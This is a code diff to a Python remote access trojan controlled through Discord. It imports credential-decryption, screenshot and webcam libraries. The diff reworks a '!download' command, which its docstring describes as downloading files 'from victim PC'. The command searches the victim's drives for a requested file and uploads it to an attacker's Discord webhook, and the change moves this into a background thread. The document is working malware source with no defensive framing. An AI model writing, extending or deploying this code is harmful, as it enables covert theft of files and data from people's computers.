@@ -11,6 +11,7 @@ import platform
 import getpass
 import requests
 import uuid
+import asyncio
 from discord.ext import commands
 from dotenv import load_dotenv
 import sqlite3
@@ -20,7 +21,6 @@ from Crypto.Cipher import AES
 import win32crypt
 from PIL import ImageGrab
 import cv2
-import glob
 
 load_dotenv()
 
@@ -341,58 +341,6 @@ def list_directory(path='.'):
     except Exception as e:
         return str(e)
 
-def download_file(file_path):
-    try:
-        file_path = file_path.strip('"').strip("'")
-        file_path = os.path.expanduser(file_path)
-        
-        # Check if file exists directly
-        if os.path.exists(file_path) and not os.path.isdir(file_path):
-            found_path = file_path
-        else:
-            # Try common path variations
-            possible_paths = [
-                file_path,
-                file_path.replace('/', '\\'),
-                file_path.replace('\\', '/'),
-                os.path.join(os.environ.get('USERPROFILE', ''), file_path),
-                os.path.join(os.environ.get('SYSTEMDRIVE', 'C:'), file_path)
-            ]
-            
-            found_path = None
-            for path in possible_paths:
-                if os.path.exists(path) and not os.path.isdir(path):
-                    found_path = path
-                    break
-            
-            if not found_path:
-                # Try using glob to search
-                try:
-                    search_pattern = f"C:\\**\\{os.path.basename(file_path)}"
-                    matches = glob.glob(search_pattern, recursive=True)
-                    if matches:
-                        found_path = matches[0]
-                except:
-                    pass
-        
-        if not found_path:
-            return f"File not found: {file_path}"
-        
-        # Check file size
-        file_size = os.path.getsize(found_path)
-        if file_size > 25 * 1024 * 1024:
-            return f"File too large: {file_size / (1024*1024):.1f}MB (Discord limit is 25MB)"
-        
-        with open(found_path, 'rb') as f:
-            from discord import SyncWebhook, File
-            webhook = SyncWebhook.from_url(WEBHOOK_URL)
-            webhook.send(file=File(f, os.path.basename(found_path)))
-        return f"Sent file: {found_path}"
-    except PermissionError:
-        return f"Permission denied: {file_path}"
-    except Exception as e:
-        return f"Download failed: {str(e)}"
-
 @bot.event
 async def on_ready():
     print(f'Logged in as {bot.user}')
@@ -517,64 +465,83 @@ async def download(ctx, *, file_path):
     """Download file from victim PC. Example: !download C:/file.txt"""
     await ctx.send(f"Attempting to download: {file_path}")
     
-    try:
-        # Remove quotes
-        file_path = file_path.strip('"').strip("'")
-        file_path = os.path.expanduser(file_path)
-        
-        # Check if file exists directly
-        if os.path.exists(file_path) and not os.path.isdir(file_path):
-            found_path = file_path
-        else:
-            # Try common path variations
-            possible_paths = [
-                file_path,
-                file_path.replace('/', '\\'),
-                file_path.replace('\\', '/'),
-                os.path.join(os.environ.get('USERPROFILE', ''), file_path),
-                os.path.join(os.environ.get('SYSTEMDRIVE', 'C:'), file_path)
-            ]
+    def download_thread():
+        try:
+            file_path_clean = file_path.strip('"').strip("'")
+            file_path_clean = os.path.expanduser(file_path_clean)
             
-            found_path = None
-            for path in possible_paths:
-                if os.path.exists(path) and not os.path.isdir(path):
-                    found_path = path
-                    break
+            if os.path.exists(file_path_clean) and not os.path.isdir(file_path_clean):
+                found_path = file_path_clean
+            else:
+                possible_paths = [
+                    file_path_clean,
+                    file_path_clean.replace('/', '\\'),
+                    file_path_clean.replace('\\', '/'),
+                    os.path.join(os.environ.get('USERPROFILE', ''), file_path_clean),
+                    os.path.join(os.environ.get('SYSTEMDRIVE', 'C:'), file_path_clean)
+                ]
+                
+                found_path = None
+                for path in possible_paths:
+                    if os.path.exists(path) and not os.path.isdir(path):
+                        found_path = path
+                        break
             
             if not found_path:
-                # Try using glob to search
-                try:
-                    search_pattern = f"C:\\**\\{os.path.basename(file_path)}"
-                    matches = glob.glob(search_pattern, recursive=True)
-                    if matches:
-                        found_path = matches[0]
-                except:
-                    pass
-        
-        if not found_path:
-            await ctx.send(f"File not found: {file_path}")
-            return
-        
-        # Check file size
-        file_size = os.path.getsize(found_path)
-        if file_size > 25 * 1024 * 1024:
-            await ctx.send(f"File too large: {file_size / (1024*1024):.1f}MB (Discord limit is 25MB)")
-            return
-        
-        with open(found_path, 'rb') as f:
-            from discord import SyncWebhook, File
-            webhook = SyncWebhook.from_url(WEBHOOK_URL)
-            webhook.send(file=File(f, os.path.basename(found_path)))
-        
-        await send_webhook(f"File downloaded: {found_path}")
-        await ctx.send(f"File sent to webhook: {found_path}")
-        
-    except PermissionError:
-        await ctx.send(f"Permission denied: {file_path}")
-        await send_webhook(f"Download failed: Permission denied for {file_path}")
-    except Exception as e:
-        await ctx.send(f"Download failed: {str(e)}")
-        await send_webhook(f"Download error: {str(e)}")
+                asyncio.run_coroutine_threadsafe(
+                    ctx.send(f"File not found: {file_path_clean}"),
+                    bot.loop
+                )
+                return
+            
+            file_size = os.path.getsize(found_path)
+            if file_size > 25 * 1024 * 1024:
+                asyncio.run_coroutine_threadsafe(
+                    ctx.send(f"File too large: {file_size / (1024*1024):.1f}MB (Discord limit is 25MB)"),
+                    bot.loop
+                )
+                return
+            
+            asyncio.run_coroutine_threadsafe(
+                ctx.send(f"Sending file: {os.path.basename(found_path)} ({file_size / 1024:.1f}KB)"),
+                bot.loop
+            )
+            
+            with open(found_path, 'rb') as f:
+                from discord import SyncWebhook, File
+                webhook = SyncWebhook.from_url(WEBHOOK_URL)
+                webhook.send(file=File(f, os.path.basename(found_path)))
+            
+            asyncio.run_coroutine_threadsafe(
+                send_webhook(f"File downloaded: {found_path}"),
+                bot.loop
+            )
+            asyncio.run_coroutine_threadsafe(
+                ctx.send(f"File sent to webhook: {os.path.basename(found_path)}"),
+                bot.loop
+            )
+            
+        except PermissionError:
+            asyncio.run_coroutine_threadsafe(
+                ctx.send(f"Permission denied: {file_path}"),
+                bot.loop
+            )
+            asyncio.run_coroutine_threadsafe(
+                send_webhook(f"Download failed: Permission denied for {file_path}"),
+                bot.loop
+            )
+        except Exception as e:
+            asyncio.run_coroutine_threadsafe(
+                ctx.send(f"Download failed: {str(e)}"),
+                bot.loop
+            )
+            asyncio.run_coroutine_threadsafe(
+                send_webhook(f"Download error: {str(e)}"),
+                bot.loop
+            )
+    
+    thread = threading.Thread(target=download_thread, daemon=True)
+    thread.start()
 
 @bot.command()
 async def delete(ctx, *, path):
